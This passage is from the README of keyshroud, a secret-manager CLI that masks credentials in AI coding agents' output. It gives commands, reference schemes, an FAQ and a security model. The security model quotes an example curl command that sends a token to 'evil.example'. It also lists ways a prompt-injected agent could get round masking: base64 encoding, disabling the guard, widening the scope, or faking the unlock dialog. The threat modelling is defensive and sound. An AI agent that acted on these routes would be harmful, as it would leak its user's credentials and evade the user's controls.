keyshroud add --env NAME --item ITEM [--notes TEXT] [--target pi|omp|both] [--stdin|--dialog]
keyshroud import [--from F|-] [--out F] [--prefix P] [--only A,B] [--skip A,B] [--yes] [--replace] [--force]
keyshroud rotate --item ITEM [--stdin|--dialog]
keyshroud wire --env NAME --item ITEM [--target pi|omp|both] [--force]
keyshroud unwire --env NAME [--target pi|omp|both]
keyshroud list                                     item references and the variables wired to them (names only)
keyshroud rm --item ITEM [--yes]                   delete an item and unwire it (dry run unless --yes)
keyshroud source                                   the sources that are set up, and the vendor CLIs found
keyshroud source add vault [--addr URL] [--namespace NS] [--ca-file PEM] [--token | --role-id ID] [--stdin|--dialog]
keyshroud source add infisical --client-id ID [--addr URL] [--ca-file PEM] [--stdin|--dialog]
keyshroud source rm vault|infisical
keyshroud setup --email EMAIL [--server URL] [--confirm-unlock | --unattended] [--registered]   (Vaultwarden)
keyshroud migrate [--item NAME]... [--env-file F]... [--yes]                                    (Vaultwarden)
keyshroud migrate --to local [--yes]                                                            (Vaultwarden -> local vault)
keyshroud unlock [--unattended | --stdin]
keyshroud rekey [--to keychain|secure-enclave|passphrase|dpapi]                                 (in a terminal)
keyshroud backup [--out FILE]                                                                   (in a terminal)
keyshroud restore FILE [--replace] [--yes]                                                      (in a terminal)
keyshroud status | lock | doctor
keyshroud mcp
keyshroud hook claude <session-start|post-tool-use>
keyshroud claude-setup --item ITEM [--settings PATH] [--ttl-ms N] [--force]
keyshroud claude-guard [--off] [--shell PATH] [--settings PATH]
keyshroud api-key --item ITEM
keyshroud link-cli [--dir DIR] [--force]
```

`--item` takes a name (stored in the default vault), `keyshroud://Name` or `bw://Name`; for `wire` also a
[source reference](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure) such as `vault://secret/app#password`.

`rm` prints what it would do (delete a local item permanently, or move a bw item to the bw trash, and
which variables it unwires) until you add `--yes`. With `--yes` it needs a terminal, or
a Touch ID approval on a Mac when an agent runs it. It works on bw only with keyshroud's own agent
account, and refuses the item Claude Code's apiKeyHelper uses. `.env.refs` files that point at a
removed item then fail as unresolved.

`run` masks output whenever stdout is not a terminal (agents, CI, pipes) and
passes the TTY through untouched for interactive use. Force either way with
`--mask` / `--no-mask`. `exec` is an alias of `run`.

`add` and `rotate` read the value from a masked prompt that shows `*` per
character. Without a terminal (an agent's shell), they open a native hidden-input
dialog instead (`osascript` on macOS, `zenity` or `kdialog` on Linux, PowerShell on Windows), so the agent
can start the command and you only paste. Over SSH or without a display, pipe the
value with `--stdin`.

`import` reads a `.env` (default `./.env`), decides which lines are secrets (by name, such as
`*_TOKEN` or `*_KEY`, or by value, such as `sk-…` or a URL with a password), and prints a plan of
names only. No vault item and no `.env.refs` is written until you add `--yes` (reading the plan opens
a vault session as any command does, with the files that belong to one): it then creates one vault item per secret,
named `<prefix> NAME` (prefix defaults to the directory name), reads each value back to verify it,
and writes `.env.refs` (`NAME=keyshroud://<prefix> NAME`) with comments and non-secret lines kept. Re-running reuses items that already
hold the same value and stops on a conflicting one. `--replace` rewrites the source file in place
instead (atomically, no backup copy). Multiline values, `${VAR}` expansion and duplicate keys are
rejected with the line number, never the value.

```bash
keyshroud import                 # dry run: which names would move
keyshroud import --yes           # store them and write .env.refs
keyshroud run --env-file .env.refs -- npm test
```

**Exit codes:** `0` ok · `2` usage · `3` vault locked or unavailable, or a source that did not accept
the sign-in · `4` secret missing or item name ambiguous · `5` refusing to overwrite existing state.
`run` exits with the child's code.

### References

| Reference | Resolves to |
|---|---|
| `keyshroud://GitHub token` | the value stored in the local vault |
| `keyshroud://GitHub token/notes` | its notes (`id` also works) |
| `!keyshroud get 'keyshroud://Item'` | the env.json / auth.json form keyshroud writes for local items |
| `bw://GitHub CLI token` | login password |
| `bw://GitHub CLI token/username` | login username (`notes`, `uri`, `id` also work) |
| `bw://Sentry/fields/dsn` | custom field `dsn` |
| `bw://AWS root/totp` | current TOTP code |
| `bw://a%2Fb` | item named `a/b` (`keyshroud://a%2Fb` alike) |
| `!bw get password 'Item'` | legacy auth.json form, still supported |
| `local://GitHub token` | the first spelling of `keyshroud://`, still read the same way |
| `vault://secret/myapp/db#password` | field `password` of the KV secret `myapp/db` on the mount `secret/` (HashiCorp Vault, OpenBao) |
| `infisical://<project id>/prod/STRIPE_KEY` | the secret `STRIPE_KEY` of environment `prod` (a folder goes before the name) |
| `op://Engineering/Sentry/dsn` | what `op read` gives for it (1Password) |
| `awssecrets://prod/stripe#api_key` | key `api_key` of a JSON secret in AWS Secrets Manager (`?region=eu-west-1` picks the region) |
| `awsssm:///prod/db/password` | the parameter `/prod/db/password` in AWS SSM Parameter Store, decrypted |
| `gcpsecrets://my-project/stripe-key` | the latest version in Google Cloud Secret Manager (`?version=3` for another) |
| `azurekeyvault://my-vault/stripe-key` | the current version in Azure Key Vault (`/<version>` for another) |
| `!keyshroud get 'vault://secret/app#key'` | the env.json / auth.json form `wire` writes for a source reference |

Source references share one shape, `<scheme>://<path>[?param=value][#key]`, with `%23`, `%3F` and `%25`
for a `#`, `?` or `%` in the path; `op://` is passed to `op` as it is written.

Item lookup is case-insensitive by name or exact by id. Duplicate names fail
closed (exit `4`) instead of guessing; the local vault refuses to create one.

### Configuration

| Variable | Default | |
|---|---|---|
| `KEYSHROUD_BACKEND` | the `backend` file | `local` or `bw`: where new items go and which vault opens by default |
| `KEYSHROUD_VAULT_KEY` | per OS | key mode when the local vault is created: `keychain`, `dpapi`, `passphrase` or `secure-enclave` (Touch ID); anything else is an error |
| `KEYSHROUD_CACHE_TTL_MS` | `3600000` | in-memory Vaultwarden snapshot + session check lifetime, and how long a long-running process keeps a value read from a source; `0` disables |
| `KEYSHROUD_SESSION_TTL_MS` | `1800000` | how long an unlocked session lasts (Vaultwarden, or a passphrase or Touch ID vault) |
| `KEYSHROUD_LOCK_TIMER` | on | `0` skips the background timer (sessions then end on the next call) |
| `KEYSHROUD_CONFIG_DIR` | `$XDG_CONFIG_HOME/keyshroud` | `vault.json`, `env.json` (wiring), `sources.json` (servers of the sources), `backend`, sessions, `bw/` (after `setup`), `guard/` (after `claude-guard`), master-password hash, redact index, audit log |
| `KEYSHROUD_KEYCHAIN_MASTER` | `vaultwarden-master-password` | keychain service names (after `setup`: `keyshroud-…`) |
| `KEYSHROUD_KEYCHAIN_CLIENT_ID` | `vaultwarden-api-client-id` | |
| `KEYSHROUD_KEYCHAIN_CLIENT_SECRET` | `vaultwarden-api-client-secret` | |
| `KEYSHROUD_AUDIT` | on | `0` disables `audit.jsonl` |
| `KEYSHROUD_PLANNER_URL` / `_MODEL` / `_API_KEY` | unset | optional naming helper for `/secret` |

## FAQ

**Do I need Vaultwarden?** No. Secrets live in an encrypted file on your machine by default.
Vaultwarden (or the official Bitwarden cloud) is optional: use it to have the same secrets on several
machines, or a copy on a server.

**Do secrets leave my machine?** Not with the local vault. With Vaultwarden or Bitwarden, only between
`bw` and your server; with a [source](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure),
only from that server to your machine. keyshroud has no backend of its own and sends no telemetry; values go into the
environment of the command you run.

**I used keyshroud 0.7. What changes?** Nothing. A machine with a `bw` login, keyshroud's files, wired
`bw://` or `!bw` entries, `BW_SESSION`, or the master password in the keychain keeps Vaultwarden as the
default and writes that down in `~/.config/keyshroud/backend`. Only a machine where none of these exist
looks new and gets the local vault; set `KEYSHROUD_BACKEND=bw` there if it should not.

**How do I leave Vaultwarden?** `keyshroud migrate --to local` shows which Vaultwarden items your wired
names use; `--yes` copies them into the local vault, checks each copy, rewires the names and makes the
local vault the default for new items. A field other than the password becomes an item of its own
(`Sentry (field dsn)`). Vaultwarden keeps the originals, the previous references are saved next to the
vault (names and references only), and `.env.refs` files keep their `bw://` references until you change
them. Other machines that use the same Vaultwarden are not affected.

**How do I back up the local vault?** `keyshroud backup` writes one file sealed under a passphrase you
choose, and `keyshroud restore FILE --yes` brings its items and their wiring back on any machine
([Backup and restore](#backup-and-restore)). A plain copy of `vault.json` is not a backup: it opens only
with its key, which stays in this machine's key store. For the same secrets on several machines at
once, use Vaultwarden or Bitwarden.

**Can a project get only its own secrets?** Yes: `keyshroud scope --only 'STRIPE_*,GH_TOKEN'` in the
repo writes a `.keyshroud.json` that narrows `run`, `env` and what the agents are told there to those
names ([Least privilege: a project's own names](#least-privilege-a-projects-own-names)).

**We use HashiCorp Vault (or AWS, 1Password, …) at work. Do I have to move the secrets?** No.
keyshroud reads them where they are: see [team secret managers](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure).
It never writes to those systems, and what your account may read there is still decided by their policies.

**Can I use it in CI or a Docker build?** Yes, with a passphrase vault. Create it once in a terminal
(`KEYSHROUD_VAULT_KEY=passphrase keyshroud unlock`), add the secrets, and copy `vault.json` into the job
(it is encrypted, so it can live in the repository or an artifact). Keep only the passphrase in the CI's
secret store, then:

```bash
mkdir -p ~/.config/keyshroud && cp vault.json ~/.config/keyshroud/
printf '%s' "$KEYSHROUD_PASSPHRASE" | keyshroud unlock --stdin   # a session of 30 minutes
keyshroud run --env-file .env.refs -- npm test
```

`--stdin` only opens an existing passphrase vault; a new passphrase is always chosen in a terminal.
`KEYSHROUD_PASSPHRASE` is the name keyshroud knows the passphrase by: commands started by `run` do not
receive that variable, and its value is masked in their output. A
server you reach over SSH can instead run `keyshroud unlock --unattended` there once (no time limit).

**Can the agent still use the key?** Yes. The command gets the real value; only the text
the model reads is masked.

**Is this a sandbox?** No. It stops *accidental* disclosure. A hostile or prompt-injected
agent can still exfiltrate a value it can use — see the [security model](#security-model).

**Why not just `.gitignore` my `.env`?** That stops commits, not reads. Agents read `.env`
to debug, and whatever they read goes to the model provider.

**Does it work on Windows?** Yes, tested on Windows 10 with Node 22. The local vault keeps its key
with DPAPI, bound to your Windows account. `bw` and other npm CLIs (`.cmd` shims) run without a shell,
the unlock dialog is a small PowerShell window, and sessions end after 30 minutes like elsewhere. Files in
`%USERPROFILE%\.config\keyshroud` are protected by your profile's ACL (you, SYSTEM, Administrators), not
by `0600`. One gap: over an SSH session with a terminal (`ssh -t`), Windows ends the lock timer when the
SSH session closes, so that session ends on the next keyshroud call instead. There is no keychain support
for the Vaultwarden master password on Windows: keyshroud asks for it (`migrate` too, in a terminal;
it is not tested there). pi `auth.json` entries of the `!command` form and the `apiKeyHelper` that
`claude-setup` writes need `/bin/sh`: for those, run keyshroud and the agent inside WSL (Git Bash beside
a native Windows Node is not enough).
DPAPI may be refused over SSH with a key (`Access is denied`): such a login carries no Windows
password. keyshroud says so; run the command in the desktop or RDP session, or give a machine used only
over SSH a passphrase vault (`keyshroud rekey --to passphrase`).

**`bw login` prints `KeyIdBackfillError`?** `bw` 2026.9 and later call an endpoint that Vaultwarden
added in 1.37.4 ([vaultwarden#7750](https://github.com/dani-garcia/vaultwarden/issues/7750)). The login
is saved anyway (`bw status` says `locked`), and `keyshroud setup` and the API-key login carry on by
themselves. Update Vaultwarden to 1.37.4 or later to make the error go away.

## Security model

keyshroud protects against **accidental disclosure**: secrets ending up in
transcripts, provider logs, screenshots, commits, or the model's context because
a command printed them.

It does **not** make a hostile or prompt-injected agent safe. An agent that can
run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a
value before printing it, can exfiltrate it. If that is your threat model, use
an egress proxy that swaps placeholder credentials on the wire (for example
Infisical Agent Vault or OneCLI), restrict which secrets each session
gets with `--only`, and keep a human approving commands.

**The local vault** is encrypted at rest (AES-256-GCM); its key is in your OS keychain (macOS
keychain, Linux Secret Service, Windows DPAPI). Any program running as you can read that key, agents
included, so in this mode keyshroud does not ask before opening the vault: the same exposure as storing
a Vaultwarden master password in the keychain, and weaker than Vaultwarden's ask-every-30-minutes
default. Create the vault with `KEYSHROUD_VAULT_KEY=passphrase` to be asked (sessions end after 30
minutes).

On a Mac, a **Touch ID vault** (`KEYSHROUD_VAULT_KEY=secure-enclave`, or `keyshroud rekey --to
secure-enclave`) closes that gap while no session is open: its key is wrapped to a P-256 key held by
the Mac's Secure Enclave, which answers only after the person at the Mac approves a Touch ID sheet (or
types the Mac's password). For the session that follows (30 minutes), the key sits in `vault.session` +
`vault.token` like a passphrase session, and any program running as you can read it; `keyshroud lock`
or a shorter `KEYSHROUD_SESSION_TTL_MS` narrows that window. Touch ID proves someone is present, not
what they meant to approve: a program already running as you can show its own sheet, or change
keyshroud or its helper to capture the next approval. There is no recovery: the vault opens on that
Mac only, so run `keyshroud backup` (or `rekey --to passphrase`) before erasing or moving it. A local
vault belongs to one machine and has no recovery of its own: `keyshroud backup` is its backup, and
Vaultwarden or Bitwarden the option for several machines. `vault.json` is safe to copy only as long as
its key is not. A backup file holds every item under its passphrase alone: whoever has the file can
guess at that passphrase offline (scrypt, N=2^17, slows each guess), so choose a long one and keep
the file off the machines agents work on.

Guarantees we test for:

- secret values never appear in argv, logs, keyshroud's own diagnostics, MCP results, hook
  output, or `audit.jsonl`; an error from `bw` is shown without anything keyshroud gave it;
- new secrets are read from a masked prompt, `--stdin`, or a native dialog, never flags;
- the dialog an agent can open says it was requested by a program, warns against the
  master password, refuses names that are not one printable line, refuses the master
  password itself, and opens one at a time (30 s pause after a cancel);
- the session file, local vault, redact index, rendered templates and auth files are `0600`;
- the local vault is replaced atomically (temporary file, fsync, rename) under a lock, changes to any
  part of it fail its integrity check (within the known limits below), and a vault that fails it is
  never overwritten;
- a local vault's passphrase is set only in a terminal and never stored; it and the Vaultwarden
  master password are refused as a secret, whichever vault the secret is going to; when a vault
  that is there cannot be asked (`bw` fails, the vault file cannot be read), nothing is stored;
- env.json, auth.json and hook index writes are locked and atomic, a writer that lost its lock writes
  nothing, and a wired name is never overwritten without `--force`. The lock is the directory pi
  and omp use themselves (`<file>.lock`, beside the file a link leads to, and beside the link too),
  so their writers wait for it and cannot break it (should keyshroud be killed while it holds one,
  pi reports the lock until the next keyshroud command clears it);
- commands started by `run` and `secrets_run` never receive `BW_SESSION`,
  `BW_PASSWORD`, `BW_CLIENTID`, `BW_CLIENTSECRET` or `KEYSHROUD_PASSPHRASE` (these names and
  `BITWARDENCLI_APPDATA_DIR` cannot be wired or set by an env file either), and with `--only` the
  other wired names are removed from what the command inherits, so `--only` really limits
  what a command can read (inside pi/omp the agent process keeps the session for
  legacy `!bw` auth entries; its value is redacted from tool output);
- two values that would get one label (`<redacted:NAME>`, `<redacted:NAME (2)>`) are both masked;
- env files may contain only references and literals: a `!command` value is
  rejected, and so are variables that change what programs load or run (`PATH`,
  `NODE_OPTIONS`, `LD_*`, `DYLD_*`, `BASH_ENV`, `GIT_SSH_COMMAND`, …), which are
  also never wired or injected (the list covers the common ones, not every tool's:
  an env file still configures the program it is used with);
- an unparseable `env.json` or `auth.json` is never overwritten;
- a [source](#team-secret-managers-vault-openbao-infisical-1password-aws-google-cloud-azure) is only
  read, at the address `source add` was given: a reference cannot name a server, the address must be
  https (http on localhost only; checked when it is set and again before every request), redirects are
  not followed, the certificate is checked whatever Node's environment says, and the token goes in a
  header, never a URL or argv. A vendor's CLI is started with a list of arguments, not a command line
  (on Windows a `.cmd` launcher such as `az.cmd` or `gcloud.cmd` runs through `cmd.exe`, with every
  argument escaped), without keyshroud's vault credentials in its environment, and no part of a
  reference can become one of its options. What a server or a vendor's CLI says when it fails is never
  passed on: an error names the reference, the HTTP status or the kind of failure, in keyshroud's
  own words (and, for a KV secret with several fields, the names of its fields). Source credentials, login tokens and the token in `~/.vault-token` are
  masked like any other value.

Known limits: the local vault's integrity check proves a file was sealed with its key, not that it is
the latest one or who sealed it. A program that can write `vault.json` can put an older copy back, and
can replace a Touch ID vault with a new one made for the same Secure Enclave key (the public half is in
the file), which then opens on your next approval with its contents instead of yours; neither reveals
what the vault held. The lock on pi's and omp's `auth.json` is their own (a directory, taken over
after 30 s): keyshroud's writers are fenced against each other and pi cannot take over a lock
keyshroud holds, but a lock that pi holds or left behind is only as safe as that scheme is between
two pi processes. pi 1.5 locks beside the file a link leads to, pi 1.2 and older beside the path as
it is written; keyshroud takes the first, and the second for the path it was itself given, and a
write that waits there cannot land once either lock is gone. What that leaves out: an older pi that
reaches `auth.json` through a different link than keyshroud does (they then share no lock at all),
so point both at the same path. The locks around calls to `bw`, the unlock dialog and the local
vault's session files are simpler: one is taken over when its holder shows no sign of life (30 s
for the session files, 60 s for `bw`, whose holder renews it while it works; a dialog counts as
open for 5 minutes and 30 s, the time it may stay on screen), so a holder that was only stalled can
overlap with the next one. That can mean a second dialog, a `bw` call that fails, or a session you
have to open again; it does not put a value anywhere. Claude Code's `settings.json` has no lock of
its own: `claude-setup` is safe against another `claude-setup` (a stalled one replaces nothing and
widens no file but the one it wrote), not against Claude Code writing the file at the same moment. The check that refuses a vault's own password as a secret asks `bw`: where
no `bw` program is found, or all `bw` answers is that nobody is logged in, there is no vault on this
machine to ask, and the value is stored; a `bw` that is there but does not start stops the save. A `.env.refs` can reference **any** item in your vault, not only the
ones you wired, and any secret your sign-in to a source may read (keep a Vault token's policy, or the
machine identity's access, as narrow as the work needs), so read a cloned repo's `.env.refs` before running `--env-file`
with it. `import` decides what is secret by heuristics and keeps everything else
as a literal; check its plan before committing `.env.refs`. The Claude Code
`PostToolUse` hook does not see failed commands (`PostToolUseFailure` cannot
rewrite output; `keyshroud claude-guard` masks those for the Bash tool, on macOS and Linux, once you turn
it on) or anything a client sends as telemetry, it masks nothing until an index exists
(written at session start, and added to by `run`, `secrets_run`, `get`, `inject`, `api-key`, `add`,
`rotate` and `wire`; a hook that fails lets the output through as it is; the guard reads the same index, and does not run the command when it cannot start), and it only knows wired
values, keys written into `auth.json` as plain text, and values keyshroud itself printed (`get`, `inject`, `api-key`), so a failed
`keyshroud get bw://…` or `run --no-mask` still shows in the clear; run
secret-using commands through `keyshroud run` or `secrets_run`, with `--only` (or
`only`) naming the secrets the command needs, since every wired secret (every one in the
[project's scope](#least-privilege-a-projects-own-names), where there is one) is injected
otherwise. A project's scope is a default, not a wall: it is a file in the repo, so whoever can write
there (the agent included) can widen or remove it, a reference names any item whatever the scope says,
and a command run from another directory is not under it. The guard is a setting of Claude Code and a
launcher file, both writable by a program running as you: an agent that means to can turn it off, as it
can skip `keyshroud run`; both guard against accidents, not against that. An agent with shell access as your user can open a
keychain-mode local vault at any time, and use a passphrase vault's session files until the session
ends. It can also read `~/.config/keyshroud/session` and use `bw` directly until that session ends —
after `setup` that reaches only the agent account; a stored master password (keychain entry or
`~/.config/keyshroud/master-password`) it can read at any time, which is why keyshroud asks
instead by default; otherwise run agents in a sandbox or container if that matters. The same
agent could also draw a window that looks like the unlock dialog; when in doubt, cancel it and run
`keyshroud unlock` in a terminal. Without `setup`, keyshroud shares bw's default login, so the
30-minute lock also ends a `bw` session you opened yourself. Redaction is exact-match, so a *partial* or transformed value
(`${TOKEN:0:10}`, base64, a line wrapped by a tool) is not masked. Two reshaped forms are: a value is
also masked without its leading and trailing spaces or line breaks, and a value of several lines or a
JSON document (a PEM key, a service account file) is also masked run by run (20 or more letters, digits
and `+/=_-`), so a key shown with line numbers or as a diff stays masked; values
shorter than 6 characters are not redacted (to avoid noise), so don't wire short
PINs. Of the keys written into `auth.json` as plain text, one that is nothing but the name of a
variable (`OPENAI_API_KEY`, `$OPENAI_API_KEY`) stands for that variable when it is set: its value is
masked, the name is not (masking it would change every file that mentions the variable). A key
with variables in it is masked as text and filled in as pi does, from the entry's own `env` first;
the values in that `env` are not masked by themselves. And a
`!command` there that is not a keyshroud reference is another program's: keyshroud does not run it
to learn what it prints, so its output is masked only when the entry has a variable's name and is
injected. pi's `/secret`, `/vault_add` and `/vault_rotate` popups store a pasted value without the spaces or line breaks
around it; for a value where those matter, use `keyshroud add --stdin`, which keeps everything
but one line break at the very end (end the input with two if the value ends with one).

Sources: `sources.json` is a plain file, so a program running as you can point the Vault source at
another https server, which then receives the token on the next read; the same program could read
`~/.vault-token` itself. A token of `vault login` is used as it is: keyshroud does not renew it, and
when it ends the references are unresolved until you log in again. A secret read from a source is
masked from the moment keyshroud reads it, not before. Wired names are read at session start and
whenever the hook's index is refreshed (`add`, `rotate`, `wire`, `source add`), source references
among them: a wired `op://` reference can bring up 1Password's own prompt then, so a reference only one
project needs belongs in its `.env.refs`. A reference that sits in a wiring file and that no command
injects is not read from a source just to mask it. When the server is away, each request waits up to
10 seconds (a first read with AppRole makes three; a vendor's CLI gets 30) and the names are
unresolved. Why a source refused is told only by kind (an HTTP status; for a vendor's CLI:
not signed in, refused access, not found, or just "failed"), guessed from the CLI's message, so the
kind can be wrong; the message itself is in your terminal when you run that CLI. keyshroud's Vault and Infisical code is tested against real servers; the `op`, `gcloud`
and `az` paths only against stand-in CLIs.

Report vulnerabilities privately — see [SECURITY.md](SECURITY.md).

## Development

```bash
npm install
npm run check        # typecheck + tests (fake bw, no real vault) + build
# the sources against real servers in Docker (Vault, OpenBao, Infisical, an AWS emulator):
export $(sh test/live-servers.sh) && node --test test/live.test.ts; sh test/live-servers.sh down
node src/cli.ts doctor   # run from source (Node ≥ 22.18 strips types)
```

See [CONTRIBUTING.md](CONTRIBUTING.md). The runtime-neutral core is in
`src/core.ts` (the local vault's file format in `src/vault.ts`, the sources' protocols in
`src/sources.ts`); agent integrations
live in `extensions/`, `src/mcp.ts` and `src/hooks.ts`.

## Credits

Inspired by [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password)
— its popup UI and diagnostics shape are ported here (MIT). Masked output follows
1Password's `op run`. Not affiliated with Bitwarden, Inc. or the Vaultwarden
project; "Bitwarden" is a trademark of Bitwarden, Inc.

## License

[MIT](LICENSE) © 2026 dinhkarate
